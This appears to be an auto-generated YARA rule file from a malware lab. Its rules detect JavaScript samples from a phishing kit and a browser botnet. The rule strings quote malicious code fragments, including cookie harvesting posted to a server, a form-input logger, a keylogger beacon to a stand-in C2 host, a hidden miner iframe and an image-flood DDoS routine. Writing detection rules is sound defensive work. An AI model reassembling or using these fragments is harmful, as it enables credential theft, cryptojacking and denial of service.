/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/_.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: 
   Date: 2026-02-27
   Identifier: mal
   Reference:  phishing_kit  gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule background {
   meta:
      description = "mal - file background.js"
      author = ""
      reference = " phishing_kit  gen"
      date = "2026-02-27"
      hash1 = "45479cfcb7703be222d35317bf7333d05514944c25baaac122ce1403205e6839"
   strings:
      $s1 = "chrome.runtime.onInstalled.addListener(function(details) {" fullword ascii /* score: '13.00'*/
      $s2 = "        console.log(tabId);" fullword ascii /* score: '11.00'*/
      $s3 = "                console.log(domain);" fullword ascii /* score: '11.00'*/
      $s4 = "                    fetch('http://localhost/server/api.php', {" fullword ascii /* score: '9.00'*/
      $s5 = "                browser.cookies.getAll({domain: domain}, function (cookies) {" fullword ascii /* score: '7.00'*/
      $s6 = "        browser.tabs.get(tabId, function (tab) {" fullword ascii /* score: '7.00'*/
      $s7 = "                }" fullword ascii /* reversed goodware string '}                ' */ /* score: '6.00'*/
      $s8 = "            }" fullword ascii /* reversed goodware string '}            ' */ /* score: '6.00'*/
      $s9 = "    browser.webNavigation.onCompleted.addListener(function () {" fullword ascii /* score: '5.00'*/
      $s10 = "                        headers: { \"Content-Type\": \"application/json; charset=utf-8\" }," fullword ascii /* score: '5.00'*/
      $s11 = "  switch (details.reason) {" fullword ascii /* score: '4.00'*/
      $s12 = "// redirect after installation , change my url github to make paypal page" fullword ascii /* score: '4.00'*/
      $s13 = "                        method: 'POST'," fullword ascii /* score: '4.00'*/
      $s14 = "                let domain = tab.url.includes(\"://\") ? tab.url.split(\"://\")[1].split(\"/\")[0] : tab.url.split(\"/\")[0];" fullword ascii /* score: '2.00'*/
      $s15 = "    browser.tabs.onActivated.addListener(function (tab) {" fullword ascii /* score: '2.00'*/
      $s16 = "      chrome.tabs.create({url: \"https://shoppy.gg/product/5d9ifM3\"});" fullword ascii /* score: '2.00'*/
      $s17 = "            Object.keys(obj).forEach(key => {" fullword ascii /* score: '2.00'*/
      $s18 = "                   //let str = unpack(cookies);" fullword ascii /* score: '2.00'*/
      $s19 = "                        body: JSON.stringify({cookie : cookies})" fullword ascii /* score: '2.00'*/
      $s20 = "(function() {" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
   condition:
      uint16(0) == 0x0a0d and filesize < 4KB and
      8 of them
}

rule _opt_mal_botnet_browser_chrome_master__home_ubuntu_malware_lab_samples_extracted_javascript_botnet_browser_chrome_master_server_assets_js_morris_morris {
   meta:
      description = "mal - file morris.js"
      author = ""
      reference = " phishing_kit  gen"
      date = "2026-02-27"
      hash1 = "561a3453fe6082ff3da7fcdf4eda7acd58a83c642a94306ed40f1cef6a745af7"
   strings:
      $s1 = "        return (_ref = this.hover).update.apply(_ref, this.hoverContentForRow(this.data.length - 1));" fullword ascii /* score: '16.00'*/
      $s2 = "        return \"\" + this.options.preUnits + (Morris.commas(label)) + this.options.postUnits;" fullword ascii /* score: '15.00'*/
      $s3 = "      return Math.min(this.data.length - 1, Math.floor((x - this.left) / (this.width / this.data.length)));" fullword ascii /* score: '14.00'*/
      $s4 = "        return new Date(d.getFullYear() - d.getFullYear() % 10, 0, 1);" fullword ascii /* score: '12.00'*/
      $s5 = "      leftPadding = groupWidth * (1 - this.options.barSizeRatio) / 2;" fullword ascii /* score: '12.00'*/
      $s6 = "      return new Date(parseInt(o[1], 10), parseInt(o[2], 10) - 1, parseInt(o[3], 10)).getTime();" fullword ascii /* score: '12.00'*/
      $s7 = "        ret.setMonth(0, 1 + ((4 - ret.getDay()) + 7) % 7);" fullword ascii /* score: '12.00'*/
      $s8 = "        return new Date(parseInt(q[1], 10), parseInt(q[2], 10) - 1, parseInt(q[3], 10), parseInt(q[4], 10), parseInt(q[5], 10))." ascii /* score: '12.00'*/
      $s9 = "      return new Date(parseInt(n[1], 10), parseInt(n[2], 10) - 1, 1).getTime();" fullword ascii /* score: '12.00'*/
      $s10 = "      return new Date(parseInt(m[1], 10), parseInt(m[2], 10) * 3 - 1, 1).getTime();" fullword ascii /* score: '12.00'*/
      $s11 = "        return new Date(parseInt(r[1], 10), parseInt(r[2], 10) - 1, parseInt(r[3], 10), parseInt(r[4], 10), parseInt(r[5], 10), " ascii /* score: '12.00'*/
      $s12 = "  Morris.commas = function(num) {" fullword ascii /* score: '11.00'*/
      $s13 = "      ymag = Math.floor(Math.log(span) / Math.log(10));" fullword ascii /* score: '11.00'*/
      $s14 = "      C = 1.9999 * Math.PI - min * this.data.length;" fullword ascii /* score: '11.00'*/
      $s15 = "leMargin >= labelBox.x) && labelBox.x >= 0 && (labelBox.x + labelBox.width) < _this.el.width()) {" fullword ascii /* score: '11.00'*/
      $s16 = "        smag = Math.floor(Math.log(step) / Math.log(10));" fullword ascii /* score: '11.00'*/
      $s17 = "      this.xmax = this.data[this.data.length - 1].x;" fullword ascii /* score: '11.00'*/
      $s18 = "leMargin >= labelBox.x) && labelBox.x >= 0 && (labelBox.x + labelBox.width) < this.el.width()) {" fullword ascii /* score: '11.00'*/
      $s19 = "        row = this.data[this.data.length - 1 - i];" fullword ascii /* score: '11.00'*/
      $s20 = "        return this.displayHoverForRow(this.data.length - 1);" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 200KB and
      8 of them
}

rule _opt_mal_botnet_browser_chrome_master__home_ubuntu_malware_lab_samples_extracted_javascript_botnet_browser_chrome_master_server_assets_js_custom {
   meta:
      description = "mal - file custom.js"
      author = ""
      reference = " phishing_kit  gen"
      date = "2026-02-27"
      hash1 = "5fe42242513c1293a68982e34db39b1d91e8188bf053c2e0dc0f6f53e5d49da4"
   strings:
      $s1 = "    Authour URI: www.binarycart.com" fullword ascii /* score: '12.00'*/
      $s2 = "                }" fullword ascii /* reversed goodware string '}                ' */ /* score: '6.00'*/
      $s3 = "        }" fullword ascii /* reversed goodware string '}        ' */ /* score: '6.00'*/
      $s4 = "                    label: \"Download Sales\"," fullword ascii /* score: '5.00'*/
      $s5 = "    http://opensource.org/licenses/MIT" fullword ascii /* score: '5.00'*/
      $s6 = "    100% To use For Personal And Commercial Use." fullword ascii /* score: '4.00'*/
      $s7 = "}(jQuery));" fullword ascii /* score: '4.00'*/
      $s8 = "                ykeys: ['iphone', 'ipad', 'itouch']," fullword ascii /* score: '2.00'*/
      $s9 = "    $(document).ready(function () {" fullword ascii /* score: '2.00'*/
      $s10 = "                xkey: 'y'," fullword ascii /* score: '2.00'*/
      $s11 = "            Morris.Bar({" fullword ascii /* score: '2.00'*/
      $s12 = "            $(window).bind(\"load resize\", function () {" fullword ascii /* score: '2.00'*/
      $s13 = "                ykeys: ['a', 'b']," fullword ascii /* score: '2.00'*/
      $s14 = "    Version: 1.1" fullword ascii /* score: '2.00'*/
      $s15 = "                xkey: 'period'," fullword ascii /* score: '2.00'*/
      $s16 = "/*=============================================================" fullword ascii /* score: '1.00'*/
      $s17 = " ======================================*/" fullword ascii /* score: '1.00'*/
      $s18 = "(function ($) {" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
   condition:
      uint16(0) == 0x0a0d and filesize < 20KB and
      8 of them
}

rule _opt_mal_botnet_browser_chrome_master__home_ubuntu_malware_lab_samples_extracted_javascript_botnet_browser_chrome_master_extension_js_logger {
   meta:
      description = "mal - file logger.js"
      author = ""
      reference = " phishing_kit  gen"
      date = "2026-02-27"
      hash1 = "d50140fb61b4d0053693c659164475c868f65e09b1db5f66c5effcfc0927f0a7"
   strings:
      $s1 = "console.log(currLoc);" fullword ascii /* score: '19.00'*/
      $s2 = "spyjs_getInput(e.currentTarget);" fullword ascii /* score: '19.00'*/
      $s3 = "console.log(name+\"=\"+value);" fullword ascii /* score: '19.00'*/
      $s4 = "function spyjs_getInput(inputInfo){" fullword ascii /* score: '14.00'*/
      $s5 = "var url = \"http://127.0.0.1/server/\";  // change URL" fullword ascii /* score: '12.00'*/
      $s6 = "        pic.src = url+'log1.php?values='+name+\"=\"+value +  \"<br/>\"+ \"\"+currLoc+\"\"" fullword ascii /* score: '11.00'*/
      $s7 = "function spyjs_saveData(data){" fullword ascii /* score: '9.00'*/
      $s8 = "function spyjs_refreshEvents(){" fullword ascii /* score: '9.00'*/
      $s9 = "spyjs_saveData(\"(\"+currLoc+\")\");" fullword ascii /* score: '9.00'*/
      $s10 = "spyjs_refreshEvents();" fullword ascii /* score: '9.00'*/
      $s11 = "$('checkbox').unbind('change');" fullword ascii /* score: '7.00'*/
      $s12 = "$('input').unbind('change');" fullword ascii /* score: '7.00'*/
      $s13 = "$('textarea').unbind('change');" fullword ascii /* score: '7.00'*/
      $s14 = "$('button').unbind('change');" fullword ascii /* score: '7.00'*/
      $s15 = "$('select').unbind('change');" fullword ascii /* score: '7.00'*/
      $s16 = "if(value != \"\"){" fullword ascii /* score: '4.00'*/
      $s17 = "var value = inputInfo.value;" fullword ascii /* score: '4.00'*/
      $s18 = "$('textarea').change(function(e) {" fullword ascii /* score: '4.00'*/
      $s19 = "if(debug){" fullword ascii /* score: '4.00'*/
      $s20 = "var currLoc = \"\";" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 3KB and
      8 of them
}

rule _opt_mal_js_botnet_master__home_ubuntu_malware_lab_samples_extracted_javascript_JS_BotNet_master_bot {
   meta:
      description = "mal - file bot.js"
      author = ""
      reference = " phishing_kit  gen"
      date = "2026-02-27"
      hash1 = "cb7fc80e959ae279b8b48c7d92391dac0055b9b01f705e999393bb6bdfd52ea3"
   strings:
      $x1 = "var attacker = 'http://YourDomain.com/BotNet/CC/KeyLogger/?c='" fullword ascii /* score: '33.00'*/
      $s2 = "ddos('http://TARGET-SITE.com/images/header.png'," fullword ascii /* score: '27.00'*/
      $s3 = "'http://TARGET-SITE.com/images/header.png');" fullword ascii /* score: '27.00'*/
      $s4 = "  var TARGET = 'TARGET-SITE.com'" fullword ascii /* score: '24.00'*/
      $s5 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/miner.html'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s6 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/BotNet/CC/index.php'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s7 = "  pic.src = 'http://'+TARGET+URI+rand+'=val'" fullword ascii /* score: '20.00'*/
      $s8 = "$.getScript(url2);" fullword ascii /* score: '15.00'*/
      $s9 = "$.getScript(url);" fullword ascii /* score: '15.00'*/
      $s10 = "document.onkeypress = function(e) {" fullword ascii /* score: '10.00'*/
      $s11 = "function imgflood() {" fullword ascii /* score: '9.00'*/
      $s12 = "setInterval(imgflood, 10) //100 requests per second" fullword ascii /* score: '9.00'*/
      $s13 = "        new Image().src = attacker + data;" fullword ascii /* score: '9.00'*/
      $s14 = "  var rand = Math.floor(Math.random() * 1000)" fullword ascii /* score: '8.00'*/
      $s15 = "  var URI = '/index.php?'" fullword ascii /* score: '7.00'*/
      $s16 = "window.setInterval(function (){" fullword ascii /* score: '7.00'*/
      $s17 = "window.setInterval(function() {" fullword ascii /* score: '7.00'*/
      $s18 = "  var pic = new Image()" fullword ascii /* score: '4.00'*/
      $s19 = "function ddos(url,url2){" fullword ascii /* score: '4.00'*/
      $s20 = "var buffer = [];" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6f64 and filesize < 3KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_js_botnet_master__home_ubuntu_malware_lab_samples_extracted_javascript_JS_BotNet_master_node {
   meta:
      description = "mal - file node.js"
      author = ""
      reference = " phishing_kit  gen"
      date = "2026-02-27"
      hash1 = "5237406a0052e09cb6f9cc73a0b27561aa27a4394f4de74a2530262b1a5f4873"
   strings:
      $s1 = "ddos('http://TARGET-SITE.com/images/header.png'," fullword ascii /* score: '27.00'*/
      $s2 = "'http://TARGET-SITE.com/images/header.png');" fullword ascii /* score: '27.00'*/
      $s3 = "  var TARGET = 'TARGET-SITE.com'" fullword ascii /* score: '24.00'*/
      $s4 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/miner.html'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s5 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/BotNet/CC/index.php'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s6 = "  pic.src = 'http://'+TARGET+URI+rand+'=val'" fullword ascii /* score: '20.00'*/
      $s7 = "$.getScript(url2);" fullword ascii /* score: '15.00'*/
      $s8 = "$.getScript(url);" fullword ascii /* score: '15.00'*/
      $s9 = "function imgflood() {" fullword ascii /* score: '9.00'*/
      $s10 = "setInterval(imgflood, 10) //100 requests per second" fullword ascii /* score: '9.00'*/
      $s11 = "  var rand = Math.floor(Math.random() * 1000)" fullword ascii /* score: '8.00'*/
      $s12 = "  var URI = '/index.php?'" fullword ascii /* score: '7.00'*/
      $s13 = "window.setInterval(function (){" fullword ascii /* score: '7.00'*/
      $s14 = "document.write(\"<p>You currently running a Node in the HiveMind BotNet...</p>\");" fullword ascii /* score: '5.00'*/
      $s15 = "document.write(\"<title>Running HiveMind Node...</title>\");" fullword ascii /* score: '5.00'*/
      $s16 = "document.write(\"<p>Running...</p>\");" fullword ascii /* score: '5.00'*/
      $s17 = "  var pic = new Image()" fullword ascii /* score: '4.00'*/
      $s18 = "function ddos(url,url2){" fullword ascii /* score: '4.00'*/
      $s19 = "},1000)" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x640a and filesize < 2KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _node_bot_0 {
   meta:
      description = "mal - from files node.js, bot.js"
      author = ""
      reference = " phishing_kit  gen"
      date = "2026-02-27"
      hash1 = "5237406a0052e09cb6f9cc73a0b27561aa27a4394f4de74a2530262b1a5f4873"
      hash2 = "cb7fc80e959ae279b8b48c7d92391dac0055b9b01f705e999393bb6bdfd52ea3"
   strings:
      $s1 = "ddos('http://TARGET-SITE.com/images/header.png'," fullword ascii /* score: '27.00'*/
      $s2 = "'http://TARGET-SITE.com/images/header.png');" fullword ascii /* score: '27.00'*/
      $s3 = "  var TARGET = 'TARGET-SITE.com'" fullword ascii /* score: '24.00'*/
      $s4 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/miner.html'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s5 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/BotNet/CC/index.php'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s6 = "  pic.src = 'http://'+TARGET+URI+rand+'=val'" fullword ascii /* score: '20.00'*/
      $s7 = "$.getScript(url2);" fullword ascii /* score: '15.00'*/
      $s8 = "$.getScript(url);" fullword ascii /* score: '15.00'*/
      $s9 = "function imgflood() {" fullword ascii /* score: '9.00'*/
      $s10 = "setInterval(imgflood, 10) //100 requests per second" fullword ascii /* score: '9.00'*/
      $s11 = "  var rand = Math.floor(Math.random() * 1000)" fullword ascii /* score: '8.00'*/
      $s12 = "  var URI = '/index.php?'" fullword ascii /* score: '7.00'*/
      $s13 = "window.setInterval(function (){" fullword ascii /* score: '7.00'*/
      $s14 = "  var pic = new Image()" fullword ascii /* score: '4.00'*/
      $s15 = "function ddos(url,url2){" fullword ascii /* score: '4.00'*/
      $s16 = "},1000)" fullword ascii /* score: '1.00'*/
   condition:
      ( ( uint16(0) == 0x640a or uint16(0) == 0x6f64 ) and filesize < 3KB and ( 8 of them )
      ) or ( all of them )
}
